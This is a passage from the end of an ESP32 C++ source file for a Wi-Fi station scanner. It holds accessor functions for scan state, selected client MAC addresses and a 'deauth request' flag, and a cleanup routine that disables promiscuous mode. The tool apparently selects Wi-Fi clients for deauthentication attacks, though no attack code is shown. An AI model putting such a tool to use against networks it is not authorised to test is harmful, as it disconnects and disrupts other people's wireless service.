    return scanning;
}

int getStationCount() {
    return stationCount;
}

int getSelectedCount() {
    return selectedCount;
}

bool isExitRequested() {
    return exitRequested;
}

bool isDeauthRequested() {
    return deauthRequested;
}

uint8_t* getSelectedMAC(int index) {
    if (index >= 0 && index < selectedCount) {
        return selectedMACs[index];
    }
    return nullptr;
}

void clearDeauthRequest() {
    deauthRequested = false;
    selectedCount = 0;
}

void cleanup() {
    stopScanning();
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(50);
    initialized = false;
    exitRequested = false;
    deauthRequested = false;
    stationCount = 0;
    selectedCount = 0;

    #if CYD_DEBUG
    Serial.println("[STATION] Cleanup complete");
    #endif
}

}  // namespace StationScan
